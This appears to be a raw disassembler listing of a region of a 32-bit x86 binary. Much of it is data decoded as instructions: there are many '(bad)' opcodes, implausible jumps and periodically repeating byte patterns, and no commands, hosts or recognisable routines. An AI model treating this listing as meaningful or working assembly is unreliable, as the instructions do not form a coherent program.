  40c078:	bound  eax,QWORD PTR ds:0x5624300
  40c07e:	add    BYTE PTR [eax+0x40],al
  40c081:	add    BYTE PTR [ecx+0x43],al
  40c084:	add    BYTE PTR [eax+0x41],al
  40c087:	add    eax,0x40436200
  40c08c:	inc    eax
  40c08d:	add    eax,0x41127462
  40c092:	mov    edi,0x550cf3a4
  40c097:	xlat   BYTE PTR ds:[ebx]
  40c098:	mov    al,ds:0xf19c40fc
  40c09d:	xchg   ebx,eax
  40c09e:	pop    edi
  40c09f:	dec    edi
  40c0a0:	imul   eax,DWORD PTR ss:[edx+0x62],0x4f
  40c0a5:	call   0xc23dbfc8
  40c0aa:	and    al,BYTE PTR [ecx+0x40]
  40c0ad:	add    eax,0x41624340
  40c0b2:	test   BYTE PTR [eax],al
  40c0b4:	and    eax,0x404043
  40c0b9:	add    BYTE PTR ds:0x626210,al
  40c0bf:	add    eax,0x43404140
  40c0c4:	inc    eax
  40c0c5:	inc    ecx
  40c0c6:	add    eax,0x10664062
  40c0cb:	inc    ebx
  40c0cc:	bound  esi,QWORD PTR [eax+0x5879222a]
  40c0d2:	inc    ecx
  40c0d3:	(bad)  
  40c0d5:	inc    eax
  40c0d6:	cs push 0x408cf367
  40c0dc:	test   al,0x40
  40c0de:	inc    ebx
  40c0df:	int3   
  40c0e0:	push   ecx
  40c0e1:	pop    ecx
  40c0e2:	bound  edx,QWORD PTR [edx+edx*1+0x40]
  40c0e6:	xor    edi,ebx
  40c0e8:	pop    edx
  40c0e9:	jno    0x40c093
  40c0eb:	addr16 dec eax
  40c0ed:	sub    BYTE PTR [eax+0x7f],dl
  40c0f0:	aaa    
  40c0f1:	inc    eax
  40c0f2:	jp     0x40c128
  40c0f4:	inc    ecx
  40c0f5:	inc    edx
  40c0f6:	inc    esp
  40c0f7:	mov    bh,0x9f
  40c0f9:	push   eax
  40c0fa:	sub    bh,al
  40c0fc:	add    eax,0x4041cc
  40c101:	add    BYTE PTR [eax],al
  40c103:	inc    eax
  40c104:	inc    eax
  40c105:	inc    ebx
  40c106:	bound  eax,QWORD PTR [eax]
  40c108:	inc    eax
  40c109:	inc    eax
  40c10a:	add    eax,0x62434162
  40c10f:	inc    eax
  40c110:	js     0x40c122
  40c112:	inc    ecx
  40c113:	add    eax,0x5404325
  40c118:	bound  eax,QWORD PTR [eax+0x40]
  40c11b:	inc    ecx
  40c11c:	inc    ebx
  40c11d:	adc    DWORD PTR [edx],ebp
  40c11f:	push   ecx
  40c120:	(bad)  
  40c121:	pusha  
  40c122:	jns    0x40c171
  40c124:	adc    al,0xd0
  40c126:	add    al,0x6b
  40c128:	adc    DWORD PTR [ebx],esi
  40c12a:	mov    esi,0x636240f8
  40c12f:	lods   eax,DWORD PTR ds:[esi]
  40c130:	out    0x25,al
  40c132:	inc    ecx
  40c133:	bound  eax,QWORD PTR [ebx+0x0]
  40c136:	adc    BYTE PTR [eax+0x0],al
  40c139:	add    eax,0x62410040
  40c13e:	inc    eax
  40c13f:	add    BYTE PTR [ebx-0x34],al
  40c142:	inc    eax
  40c143:	add    eax,0x78434040
  40c148:	bound  eax,QWORD PTR [ecx+0x78]
  40c14b:	add    eax,0x62404043
  40c150:	addps  xmm5,XMMWORD PTR [esi+0x6c]
  40c154:	add    esp,DWORD PTR [ecx-0x48]
  40c157:	bound  esi,QWORD PTR [ecx]
  40c159:	jno    0x40c103
  40c15b:	sub    dh,BYTE PTR [eax+edi*8+0x583e5343]
  40c162:	adc    DWORD PTR [eax-0x352d9cae],ecx
  40c168:	je     0x40c165
  40c16a:	mov    esp,0x84715663
  40c16f:	stc    
  40c170:	push   0x2454412a
  40c175:	test   eax,0xd1465a83
  40c17a:	inc    ecx
  40c17b:	inc    eax
  40c17c:	add    eax,0x43436240
  40c181:	add    eax,0x62004040
  40c186:	inc    eax
  40c187:	add    BYTE PTR [ecx+0x40],al
  40c18a:	inc    ebx
  40c18b:	test   BYTE PTR ds:0x58054041,ah
  40c191:	inc    eax
  40c192:	inc    eax
  40c193:	bound  eax,QWORD PTR [eax+0x66]
  40c196:	inc    ecx
  40c197:	inc    eax
  40c198:	add    eax,0x350d6100
  40c19d:	test   al,0xec
  40c19f:	pop    ds
  40c1a0:	popf   
  40c1a1:	pop    esp
  40c1a2:	push   esp
  40c1a3:	retf   
  40c1a4:	in     al,0x3
  40c1a6:	xlat   BYTE PTR ds:[ebx]
  40c1a7:	cmp    al,al
  40c1a9:	xor    BYTE PTR [edi+ecx*2-0x58],ah
  40c1ad:	aas    
  40c1ae:	inc    ecx
  40c1af:	pop    ebp
  40c1b0:	xor    ebp,DWORD PTR [edi+eax*8]
  40c1b3:	inc    ecx
  40c1b4:	jge    0x40c1b6
  40c1b6:	add    BYTE PTR [ebx+0x40],al
  40c1b9:	bound  eax,QWORD PTR ds:0x25404110
  40c1bf:	add    ah,cl
  40c1c1:	inc    ebx
  40c1c2:	add    eax,0x40402562
  40c1c7:	add    BYTE PTR [eax+0x40],al
  40c1ca:	inc    ecx
  40c1cb:	inc    ecx
  40c1cc:	add    eax,0x78434025
  40c1d1:	bound  eax,QWORD PTR [eax-0x7c]
  40c1d4:	inc    eax
  40c1d5:	inc    ecx
  40c1d6:	jns    0x40c21b
  40c1d8:	mov    al,0x57
  40c1da:	sub    esp,edx
  40c1dc:	(bad)  
  40c1dd:	and    esi,DWORD PTR [eax+esi*1]
  40c1e0:	popa   
  40c1e1:	icebp  
  40c1e2:	xchg   edx,eax
  40c1e3:	mov    ebp,0x4c6b62ac
  40c1e8:	test   DWORD PTR [ebp+0x7a],0xfd1d90a8
  40c1ef:	inc    eax
  40c1f0:	cwde   
  40c1f1:	push   eax
  40c1f2:	inc    ecx
  40c1f3:	inc    eax
  40c1f4:	inc    eax
  40c1f5:	inc    ebx
  40c1f6:	int3   
  40c1f7:	add    BYTE PTR ds:0x56240,al
  40c1fd:	inc    ebx
  40c1fe:	inc    eax
  40c1ff:	inc    eax
  40c200:	add    BYTE PTR [ecx+0x62],al
  40c203:	bound  eax,QWORD PTR [eax]
  40c205:	int3   
  40c206:	inc    eax
  40c207:	inc    ebx
  40c208:	add    eax,0x43624041
  40c20d:	adc    BYTE PTR [ecx+0x5],al
  40c210:	inc    eax
  40c211:	add    eax,DWORD PTR [edx+0x24]
  40c214:	pushf  
  40c215:	imul   esi,DWORD PTR [ecx],0x2a92af20
  40c21b:	xor    eax,0x566c5884
  40c220:	and    esi,DWORD PTR [ebp+0x63c31c41]
  40c226:	push   ebp
  40c227:	dec    ecx
  40c228:	inc    esi
  40c229:	daa    
  40c22a:	jbe    0x40c1f9
  40c22c:	add    al,0xdd
  40c22e:	inc    edi
  40c22f:	mov    ch,0x93
  40c231:	imul   esp,DWORD PTR [ecx+edi*1],0x1e
  40c235:	bound  eax,QWORD PTR [ebx+0x40]
  40c238:	adc    BYTE PTR ds:0x4158cc40,al
  40c23e:	inc    ebx
  40c23f:	bound  eax,QWORD PTR [ecx+0x40]
  40c242:	add    eax,0x4140
  40c247:	and    eax,0x40400062
  40c24c:	add    eax,0x84404340
  40c251:	int3   
  40c252:	js     0x40c254
  40c254:	inc    ecx
  40c255:	adc    BYTE PTR [edx+0xf],ah
  40c258:	inc    edx
  40c259:	(bad)
  40c25c:	xor    ebx,DWORD PTR [ebp+0x72]
  40c25f:	pop    edx
  40c260:	add    al,0xfd
  40c262:	outs   dx,BYTE PTR ds:[esi]
  40c263:	fisubr WORD PTR [edx]
  40c265:	arpl   WORD PTR [esi+0x4b],dx
  40c268:	ins    BYTE PTR es:[edi],dx
  40c269:	daa    
  40c26a:	hlt    
  40c26b:	inc    esi
  40c26c:	add    BYTE PTR [eax+0x41],al
  40c26f:	inc    eax
  40c270:	inc    ebx
  40c271:	bound  ax,DWORD PTR ds:0x40434100
  40c278:	add    eax,0x40054062
  40c27d:	bound  eax,QWORD PTR [ecx+0x40]
  40c280:	inc    ebx
  40c281:	inc    eax
  40c282:	add    eax,0x25405841
  40c287:	bound  eax,QWORD PTR [eax+0x43]
  40c28a:	inc    eax
  40c28b:	adc    BYTE PTR ds:0xedfca83d,bl
  40c291:	jne    0x40c294
  40c293:	mov    edi,0x6a124956
  40c298:	stos   DWORD PTR es:[edi],eax
  40c299:	add    DWORD PTR [edi],0x69
  40c29c:	aas    
  40c29d:	xor    al,0x50
  40c29f:	test   eax,0x512b41b0
  40c2a4:	dec    edi
  40c2a5:	mov    dh,0x15
  40c2a7:	sub    al,0x15
  40c2a9:	inc    ebx
  40c2aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2ab:	repz adc al,0xdf
  40c2ae:	retf   
  40c2af:	arpl   cx,cx
  40c2b1:	xor    BYTE PTR [eax+0x41],al
  40c2b4:	inc    ebx
  40c2b5:	inc    eax
  40c2b6:	add    eax,0x43406262
  40c2bb:	inc    ecx
  40c2bc:	adc    BYTE PTR [eax],al
  40c2be:	inc    eax
  40c2bf:	add    eax,0x43000562
  40c2c4:	add    BYTE PTR [ecx+0x40],al
  40c2c7:	inc    eax
  40c2c8:	add    eax,0x400062
  40c2cd:	inc    ebx
  40c2ce:	inc    eax
  40c2cf:	js     0x40c312
  40c2d1:	inc    ecx
  40c2d2:	bound  eax,QWORD PTR [eax-0x2a]
  40c2d5:	dec    ebp
  40c2d6:	imul   esp,DWORD PTR [ebx+0x11],0x48484261
  40c2dd:	push   ebx
  40c2de:	ins    BYTE PTR es:[edi],dx
  40c2df:	sahf   
  40c2e0:	inc    ebp
  40c2e1:	fadd   QWORD PTR [ebx+0x40]
  40c2e4:	push   esi
  40c2e5:	sbb    dl,BYTE PTR [ebx+0x42632a51]
  40c2eb:	xor    DWORD PTR [ebp+edx*4-0x5],ebx
  40c2ef:	xor    al,0x10
  40c2f1:	inc    esp
  40c2f2:	add    al,0x6c
  40c2f4:	dec    esi
  40c2f5:	aaa    
  40c2f6:	(bad)  
  40c2f7:	std    
  40c2f8:	bound  ebp,QWORD PTR [edi+0x62]
  40c2fb:	inc    eax
  40c2fc:	add    eax,0x40430041
  40c301:	inc    eax
  40c302:	inc    ecx
  40c303:	inc    eax
  40c304:	inc    eax
  40c305:	bound  eax,QWORD PTR ds:0x5624300
  40c30b:	add    BYTE PTR [eax+0x40],al
  40c30e:	add    BYTE PTR [ecx+0x43],al
  40c311:	add    BYTE PTR [eax+0x41],al
  40c314:	add    eax,0x40436200
  40c319:	inc    eax
  40c31a:	add    eax,0x94727762
  40c31f:	push   edi
  40c320:	cmp    ebp,esp
  40c322:	dec    esp
  40c323:	or     al,0xf7
  40c325:	jns    0x40c2c9
  40c327:	mov    bl,0x68
  40c329:	arpl   WORD PTR ds:0x2fd4fe8,ax
  40c32f:	inc    edi
  40c330:	inc    eax
  40c331:	inc    esp
  40c332:	inc    ecx
  40c333:	inc    eax
  40c334:	add    eax,0x41624340
  40c339:	test   BYTE PTR [eax],al
  40c33b:	and    eax,0x404043
  40c340:	add    BYTE PTR ds:0x626210,al
  40c346:	add    eax,0x43404140
  40c34b:	inc    eax
  40c34c:	inc    ecx
  40c34d:	add    eax,0x10664062
  40c352:	inc    ebx
  40c353:	(bad)  
  40c354:	test   DWORD PTR [esp+eax*2+0x60934b49],0x2d1c4f3c
  40c35f:	nop
  40c360:	adc    eax,DWORD PTR [edx+0x4e]
  40c363:	addr16 inc ecx
  40c365:	leave  
  40c366:	(bad)  
  40c367:	mov    al,ch
  40c369:	adc    BYTE PTR [ebp+0xd],bl
  40c36c:	inc    eax
  40c36d:	inc    esp
  40c36e:	arpl   WORD PTR [ebx-0x76],ax
  40c371:	push   0x5034654e
  40c376:	xor    BYTE PTR [ebx],0xa3
  40c379:	inc    eax
  40c37a:	pop    edi
  40c37b:	in     eax,dx
  40c37c:	inc    ebx
  40c37d:	xlat   BYTE PTR ds:[ebx]
  40c37e:	test   al,0x44
  40c380:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c381:	pusha  
  40c382:	dec    esi
  40c383:	bound  ebp,QWORD PTR [edx]
  40c385:	rol    BYTE PTR ds:0x4041cc,0x0
  40c38c:	add    BYTE PTR [eax+0x40],al
  40c38f:	inc    ebx
  40c390:	bound  eax,QWORD PTR [eax]
  40c392:	inc    eax
  40c393:	inc    eax
  40c394:	add    eax,0x62434162
  40c399:	inc    eax
  40c39a:	js     0x40c3ac
  40c39c:	inc    ecx
  40c39d:	add    eax,0x5404325
  40c3a2:	bound  eax,QWORD PTR [eax+0x40]
  40c3a5:	inc    ecx
  40c3a6:	inc    ebx
  40c3a7:	adc    BYTE PTR [eax-0x3b],al
  40c3aa:	inc    esp
  40c3ab:	pop    edi
  40c3ac:	mov    al,ds:0x31be6240
  40c3b1:	fstp   TBYTE PTR [edi]
  40c3b3:	inc    eax
  40c3b4:	fsubr  DWORD PTR [edx]
  40c3b6:	pop    eax
  40c3b7:	add    eax,0x5344406c
  40c3bc:	xchg   ebx,eax
  40c3bd:	inc    eax
  40c3be:	or     eax,0x3f400ff7
  40c3c3:	push   edi
  40c3c4:	dec    eax
  40c3c5:	sub    cl,bl
  40c3c7:	inc    ebx
  40c3c8:	inc    ebx
  40c3c9:	inc    eax
  40c3ca:	mov    ds:0x257f7d5f,eax
  40c3cf:	inc    ecx
  40c3d0:	bound  eax,QWORD PTR [ebx+0x0]
  40c3d3:	adc    BYTE PTR [eax+0x0],al
  40c3d6:	add    eax,0x62410040
  40c3db:	inc    eax
  40c3dc:	add    BYTE PTR [ebx-0x34],al
  40c3df:	inc    eax
  40c3e0:	add    eax,0x78434040
  40c3e5:	bound  eax,QWORD PTR [ecx+0x78]
  40c3e8:	add    eax,0x62404043
  40c3ed:	dec    edi
  40c3ee:	push   edx
  40c3ef:	rol    DWORD PTR [eax+0x7b],1
  40c3f2:	pop    edi
  40c3f3:	outs   dx,BYTE PTR ds:[esi]
  40c3f4:	inc    esp
  40c3f5:	xor    eax,0x7f3dd9e4
  40c3fa:	jmp    0xec0c:0xcb4026b4
  40c401:	dec    esp
  40c402:	pop    ebx
  40c403:	arpl   WORD PTR [ebx+eax*2-0x42],di
  40c407:	shl    DWORD PTR [ebx],0xdf
  40c40a:	daa    
  40c40b:	mov    ebp,0xeb150865
  40c410:	loope  0x40c415
  40c412:	mov    ebp,0x40415403
  40c417:	add    eax,0x43436240
  40c41c:	add    eax,0x62004040
  40c421:	inc    eax
  40c422:	add    BYTE PTR [ecx+0x40],al
  40c425:	inc    ebx
  40c426:	test   BYTE PTR ds:0x58054041,ah
  40c42c:	inc    eax
  40c42d:	inc    eax
  40c42e:	bound  eax,QWORD PTR [eax+0x66]
  40c431:	inc    ecx
  40c432:	inc    eax
  40c433:	add    eax,0x28c99c00
  40c438:	enter  0x439e,0xc8
  40c43c:	or     DWORD PTR [edx+0x26],esp
  40c43f:	inc    eax
  40c440:	lsl    edi,WORD PTR [edi+0x516dfd42]
  40c447:	inc    eax
  40c448:	jg     0x40c3e9
  40c44a:	sub    BYTE PTR [eax],dh
  40c44c:	bound  eax,QWORD PTR [eax-0x35]
  40c44f:	inc    ecx
  40c450:	adc    al,BYTE PTR [eax]
  40c452:	add    BYTE PTR [ebx+0x40],al
  40c455:	bound  eax,QWORD PTR ds:0x25404110
  40c45b:	add    ah,cl
  40c45d:	inc    ebx
  40c45e:	add    eax,0x40402562
  40c463:	add    BYTE PTR [eax+0x40],al
  40c466:	inc    ecx
  40c467:	inc    ecx
  40c468:	add    eax,0x78434025
  40c46d:	bound  eax,QWORD PTR [eax-0x7c]
  40c470:	inc    eax
  40c471:	inc    ecx
  40c472:	adc    ebx,DWORD PTR [edi]
  40c474:	loope  0x40c485
  40c476:	bound  esp,QWORD PTR [esi]
  40c478:	inc    eax
  40c479:	aad    0x64
  40c47b:	jl     0x40c4e3
  40c47d:	xor    dl,al
  40c47f:	mov    al,0x46
  40c481:	lods   eax,DWORD PTR ds:[esi]
  40c482:	mov    ah,0xbf
  40c484:	int    0x33
  40c486:	sbb    al,0xd
  40c488:	inc    eax
  40c489:	cmp    DWORD PTR [edi+edi*1],ebp
  40c48c:	add    DWORD PTR [eax+0xa30cb62],eax
  40c492:	inc    ebx
  40c493:	aas    
  40c494:	fisttp QWORD PTR [eax-0x40]
  40c497:	jle    0x40c505
  40c499:	or     BYTE PTR [edx],dl
  40c49b:	cmp    ebp,DWORD PTR [eax+0x2c494925]
  40c4a1:	mov    ah,0xb5
  40c4a3:	aas    
  40c4a4:	push   es
  40c4a5:	inc    ecx
  40c4a6:	inc    eax
  40c4a7:	inc    eax
  40c4a8:	inc    ebx
  40c4a9:	int3   
  40c4aa:	add    BYTE PTR ds:0x56240,al
  40c4b0:	inc    ebx
  40c4b1:	inc    eax
  40c4b2:	inc    eax
  40c4b3:	add    BYTE PTR [ecx+0x62],al
  40c4b6:	bound  eax,QWORD PTR [eax]
  40c4b8:	int3   
  40c4b9:	inc    eax
  40c4ba:	inc    ebx
  40c4bb:	add    eax,0x43624041
  40c4c0:	adc    BYTE PTR [ecx+0x5],al
  40c4c3:	inc    eax
  40c4c4:	std    
  40c4c5:	and    DWORD PTR [edx+0x43],eax
  40c4c8:	jo     0x40c484
  40c4ca:	sub    BYTE PTR [edi],bh
  40c4cc:	or     eax,0x53d17c4d
  40c4d1:	push   ebp
  40c4d2:	(bad)  
  40c4d3:	mov    eax,0x3d78a8f8
  40c4d8:	bound  eax,QWORD PTR [ebx+0x40]
  40c4db:	adc    BYTE PTR ds:0x4158cc40,al
  40c4e1:	inc    ebx
  40c4e2:	bound  eax,QWORD PTR [ecx+0x40]
  40c4e5:	add    eax,0x4140
  40c4ea:	and    eax,0x40400062
  40c4ef:	add    eax,0x84404340
  40c4f4:	int3   
  40c4f5:	js     0x40c4f7
  40c4f7:	inc    ecx
  40c4f8:	adc    BYTE PTR [edx+0xf],ah
  40c4fb:	cmp    esi,edi
  40c4fd:	mov    edi,0x19c66524
  40c502:	iret   
  40c503:	xchg   esp,eax
  40c504:	push   ds
  40c505:	dec    esi
  40c506:	popa   
  40c507:	(bad)  
  40c509:	inc    edx
  40c50a:	inc    edx
  40c50b:	inc    esi
  40c50c:	rcl    DWORD PTR [ebx],1
  40c50e:	xor    al,0x90
  40c510:	push   ebx
  40c511:	jge    0x40c57a
  40c513:	cmp    DWORD PTR [edx+0x1],edx
  40c516:	inc    ebp
  40c517:	aas    
  40c518:	push   esp
  40c519:	imul   ebp,DWORD PTR [eax],0x20
  40c51c:	jb     0x40c551
  40c51e:	add    BYTE PTR [eax+0x41],al
  40c521:	inc    eax
  40c522:	inc    ebx
  40c523:	bound  ax,DWORD PTR ds:0x40434100
  40c52a:	add    eax,0x40054062
  40c52f:	bound  eax,QWORD PTR [ecx+0x40]
  40c532:	inc    ebx
  40c533:	inc    eax
  40c534:	add    eax,0x25405841
  40c539:	bound  eax,QWORD PTR [eax+0x43]
  40c53c:	inc    eax
  40c53d:	adc    BYTE PTR [edi+0x420b307d],al
  40c543:	pop    es
  40c544:	es push esi
  40c546:	push   eax
  40c547:	es jmp 0x4d15c9f0
  40c54d:	jae    0x40c54d
  40c54f:	or     al,BYTE PTR [ecx+edx*2+0x70]
  40c553:	cmp    cl,dl
  40c555:	leave  
  40c556:	arpl   WORD PTR [ebx-0x4],sp
  40c559:	fisub  WORD PTR [edx+0x37]
  40c55c:	or     edi,ebx
  40c55e:	test   al,0x29
  40c560:	pop    ecx
  40c561:	cs inc eax
  40c563:	sbb    eax,0xd010c91b
  40c568:	pusha  
  40c569:	inc    edx
  40c56a:	xor    dh,bh
  40c56c:	fistp  QWORD PTR gs:[eax+0x6c7d3602]
  40c573:	xchg   esp,eax
  40c574:	mov    dl,0xeb
  40c576:	inc    eax
  40c577:	inc    ecx
  40c578:	inc    ebx
  40c579:	inc    eax
  40c57a:	add    eax,0x43406262
  40c57f:	inc    ecx
  40c580:	adc    BYTE PTR [eax],al
  40c582:	inc    eax
  40c583:	add    eax,0x43000562
  40c588:	add    BYTE PTR [ecx+0x40],al
  40c58b:	inc    eax
  40c58c:	add    eax,0x400062
  40c591:	inc    ebx
  40c592:	inc    eax
  40c593:	js     0x40c5d6
  40c595:	inc    ecx
  40c596:	bound  eax,QWORD PTR [eax+0x41]
  40c599:	test   BYTE PTR [esi],dl
  40c59b:	ins    BYTE PTR es:[edi],dx
  40c59c:	leave  
  40c59d:	enter  0xb737,0x14
  40c5a1:	bound  esp,QWORD PTR [ebp+0x44]
  40c5a4:	inc    edi
  40c5a5:	inc    esi
  40c5a6:	aaa    
  40c5a7:	adc    BYTE PTR [esp+esi*4-0x303a8322],cl
  40c5ae:	les    edi,FWORD PTR [ebx+0x6d121252]
  40c5b4:	pop    ecx
  40c5b5:	shl    ebx,cl
  40c5b7:	inc    eax
  40c5b8:	popf   
  40c5b9:	add    DWORD PTR [edi+edi*4+0x5000400b],edi
  40c5c0:	pushf  
  40c5c1:	arpl   WORD PTR ds:0x536046b0,dx
  40c5c7:	mov    edi,0xc3fc4fa8
  40c5cc:	bound  eax,QWORD PTR [eax+0x5]
  40c5cf:	inc    ecx
  40c5d0:	add    BYTE PTR [ebx+0x40],al
  40c5d3:	inc    eax
  40c5d4:	inc    ecx
  40c5d5:	inc    eax
  40c5d6:	inc    eax
  40c5d7:	bound  eax,QWORD PTR ds:0x5624300
  40c5dd:	add    BYTE PTR [eax+0x40],al
  40c5e0:	add    BYTE PTR [ecx+0x43],al
  40c5e3:	add    BYTE PTR [eax+0x41],al
  40c5e6:	add    eax,0x40436200
  40c5eb:	inc    eax
  40c5ec:	add    eax,0x50401362
  40c5f1:	ja     0x40c638
  40c5f3:	xor    al,0xcf
  40c5f5:	mov    ah,0x41
  40c5f7:	inc    eax
  40c5f8:	repz adc BYTE PTR [ecx+0xf],al
  40c5fc:	bound  eax,QWORD PTR ds:0xb9484047
  40c602:	(bad)  
  40c603:	cmp    al,dl
  40c605:	retf   
  40c606:	and    al,0x50
  40c608:	xor    eax,0x65b4f4d6
  40c60d:	out    dx,eax
  40c60e:	mov    eax,0x635f0140
  40c613:	add    eax,0x4040abdd
  40c618:	pop    ds
  40c619:	adc    dh,bh
  40c61b:	leave  
  40c61c:	jle    0x40c5ce
  40c61e:	inc    ecx
  40c61f:	inc    eax
  40c620:	add    eax,0x41624340
  40c625:	test   BYTE PTR [eax],al
  40c627:	and    eax,0x404043
  40c62c:	add    BYTE PTR ds:0x626210,al
  40c632:	add    eax,0x43404140
  40c637:	inc    eax
  40c638:	inc    ecx
  40c639:	add    eax,0x10664062
  40c63e:	inc    ebx
  40c63f:	bound  esi,QWORD PTR [ecx]
  40c641:	inc    eax
  40c642:	add    DWORD PTR ds:0x46bc90e8,edx
  40c648:	ins    BYTE PTR es:[edi],dx
  40c649:	push   eax
  40c64a:	pop    ds
  40c64b:	inc    ebp
  40c64c:	bound  edi,QWORD PTR [edi+0x40e63763]
  40c652:	dec    esp
  40c653:	xlat   BYTE PTR ds:[ebx]
  40c654:	mov    DWORD PTR [eax-0x62],0x91402938
  40c65b:	int    0xbc
  40c65d:	inc    eax
  40c65e:	gs arpl cx,sp
  40c661:	inc    eax
  40c662:	aas    
  40c663:	jg     0x40c6c7
  40c665:	inc    edx
  40c666:	fnsave [eax+0xc6910e0]
  40c66c:	imul   edx,DWORD PTR [eiz*8+0x71406915],0x4041cc05
  40c677:	add    BYTE PTR [eax],al
  40c679:	add    BYTE PTR [eax+0x40],al
  40c67c:	inc    ebx
  40c67d:	bound  eax,QWORD PTR [eax]
  40c67f:	inc    eax
  40c680:	inc    eax
  40c681:	add    eax,0x62434162
  40c686:	inc    eax
  40c687:	js     0x40c699
  40c689:	inc    ecx
  40c68a:	add    eax,0x5404325
  40c68f:	bound  eax,QWORD PTR [eax+0x40]
  40c692:	inc    ecx
  40c693:	inc    ebx
  40c694:	push   eax
  40c695:	inc    ecx
  40c696:	ror    BYTE PTR [eax],0xcb
  40c699:	push   edx
  40c69a:	inc    eax
  40c69b:	inc    esi
  40c69c:	jns    0x40c64b
  40c69e:	retf   
  40c69f:	arpl   WORD PTR [eax+ebp*1+0x673eb040],si
  40c6a6:	mov    edi,0x10413550
  40c6ab:	je     0x40c6ed
  40c6ad:	push   esi
  40c6ae:	mov    edi,0x259f4207
  40c6b3:	inc    ecx
  40c6b4:	bound  eax,QWORD PTR [ebx+0x0]
  40c6b7:	adc    BYTE PTR [eax+0x0],al
  40c6ba:	add    eax,0x62410040
  40c6bf:	inc    eax
  40c6c0:	add    BYTE PTR [ebx-0x34],al
  40c6c3:	inc    eax
  40c6c4:	add    eax,0x78434040
  40c6c9:	bound  eax,QWORD PTR [ecx+0x78]
  40c6cc:	add    eax,0x62404043
  40c6d1:	inc    eax
  40c6d2:	imul   esi,DWORD PTR [edi-0x58],0x3c02d972
  40c6d9:	inc    eax
  40c6da:	jae    0x40c6a8
  40c6dc:	inc    edx
  40c6dd:	(bad)  
  40c6de:	(bad)  
  40c6df:	int3   
  40c6e0:	inc    eax
  40c6e1:	inc    ecx
  40c6e2:	ins    BYTE PTR es:[edi],dx
  40c6e3:	mov    ecx,0x41d9a893
  40c6e8:	inc    eax
  40c6e9:	add    eax,0x43436240
  40c6ee:	add    eax,0x62004040
  40c6f3:	inc    eax
  40c6f4:	add    BYTE PTR [ecx+0x40],al
  40c6f7:	inc    ebx
  40c6f8:	test   BYTE PTR ds:0x58054041,ah
  40c6fe:	inc    eax
  40c6ff:	inc    eax
  40c700:	bound  eax,QWORD PTR [eax+0x66]
  40c703:	inc    ecx
  40c704:	inc    eax
  40c705:	add    eax,0xd030cd00
  40c70a:	adc    al,0xf
  40c70c:	jnp    0x40c720
  40c70e:	in     al,0x74
  40c710:	ins    BYTE PTR es:[edi],dx
  40c711:	inc    eax
  40c712:	imul   edi,DWORD PTR [ecx],0x7362bc62
  40c718:	add    DWORD PTR [eax-0x1],0xf
  40c71c:	dec    edi
  40c71d:	adc    eax,0x40434065
  40c722:	pusha  
  40c723:	aas    
  40c724:	in     al,dx
  40c725:	retf   
  40c726:	fadd   QWORD PTR [ecx-0x2f]
  40c729:	inc    eax
  40c72a:	pop    edx
  40c72b:	movups XMMWORD PTR [eax],xmm0
  40c72e:	add    BYTE PTR [ebx+0x40],al
  40c731:	bound  eax,QWORD PTR ds:0x25404110
  40c737:	add    ah,cl
  40c739:	inc    ebx
  40c73a:	add    eax,0x40402562
  40c73f:	add    BYTE PTR [eax+0x40],al
  40c742:	inc    ecx
  40c743:	inc    ecx
  40c744:	add    eax,0x78434025
  40c749:	bound  eax,QWORD PTR [eax-0x7c]
  40c74c:	inc    eax
  40c74d:	inc    ecx
  40c74e:	inc    ecx
  40c74f:	jmp    0xb181ad57
  40c754:	aas    
  40c755:	mov    eax,0x6f0442a
  40c75a:	rcr    DWORD PTR [ebp-0x2bfadbc],1
  40c760:	arpl   di,si
  40c762:	inc    eax
  40c763:	popa   
  40c764:	lahf   
  40c765:	sub    ch,BYTE PTR es:[edi-0x4c]
  40c769:	ret    0x9f40
  40c76c:	adc    DWORD PTR [ecx+0x40],eax
  40c76f:	inc    eax
  40c770:	inc    ebx
  40c771:	int3   
  40c772:	add    BYTE PTR ds:0x56240,al
  40c778:	inc    ebx
  40c779:	inc    eax
  40c77a:	inc    eax
  40c77b:	add    BYTE PTR [ecx+0x62],al
  40c77e:	bound  eax,QWORD PTR [eax]
  40c780:	int3   
  40c781:	inc    eax
  40c782:	inc    ebx
  40c783:	add    eax,0x43624041
  40c788:	adc    BYTE PTR [ecx+0x5],al
  40c78b:	inc    eax
  40c78c:	jae    0x40c7ce
  40c78e:	test   al,0xd
  40c790:	inc    ecx
  40c791:	inc    eax
  40c792:	cmp    dh,dh
  40c794:	pushf  
  40c795:	sub    bl,al
  40c797:	jae    0x40c7e0
  40c799:	aas    
  40c79a:	xchg   ebp,eax
  40c79b:	jg     0x40c7b6
  40c79d:	inc    eax
  40c79e:	inc    esp
  40c79f:	mov    BYTE PTR [eax+eax*2],ah
  40c7a2:	jge    0x40c81e
  40c7a4:	inc    edx
  40c7a5:	sub    bh,ah
  40c7a7:	(bad)  
  40c7a8:	mov    al,0x40
  40c7aa:	aam    0xa
  40c7ac:	and    DWORD PTR [ebp+ebp*2+0x42],ecx
  40c7b0:	inc    eax
  40c7b1:	inc    eax
  40c7b2:	xor    dl,BYTE PTR [edx]
  40c7b4:	test   BYTE PTR [bp+si],al
  40c7b7:	push   ecx
  40c7b8:	xor    DWORD PTR [esp+esi*2],edi
  40c7bb:	sub    DWORD PTR [edx],ebx
  40c7bd:	ret    
  40c7be:	fcom   QWORD PTR [eax+0x6211406c]
  40c7c4:	inc    ebx
  40c7c5:	inc    eax
  40c7c6:	adc    BYTE PTR ds:0x4158cc40,al
  40c7cc:	inc    ebx
  40c7cd:	bound  eax,QWORD PTR [ecx+0x40]
  40c7d0:	add    eax,0x4140
  40c7d5:	and    eax,0x40400062
  40c7da:	add    eax,0x84404340
  40c7df:	int3   
  40c7e0:	js     0x40c7e2
  40c7e2:	inc    ecx
  40c7e3:	adc    BYTE PTR [edx+0xf],ah
  40c7e6:	loop   0x40c790
  40c7e8:	mov    edi,0x40a0648d
  40c7ed:	inc    esp
  40c7ee:	jno    0x40c7f4
  40c7f0:	mov    edi,0x4047a868
  40c7f5:	xor    esp,DWORD PTR [edx-0x1a]
  40c7f8:	xchg   DWORD PTR [eax+0x10],ebp
  40c7fb:	lds    ebp,FWORD PTR [esi]
  40c7fd:	ins    DWORD PTR es:[edi],dx
  40c7fe:	push   eax
  40c7ff:	bound  ecx,QWORD PTR [edx+0x40414000]
  40c805:	inc    ebx
  40c806:	bound  ax,DWORD PTR ds:0x40434100
  40c80d:	add    eax,0x40054062
  40c812:	bound  eax,QWORD PTR [ecx+0x40]
  40c815:	inc    ebx
  40c816:	inc    eax
  40c817:	add    eax,0x25405841
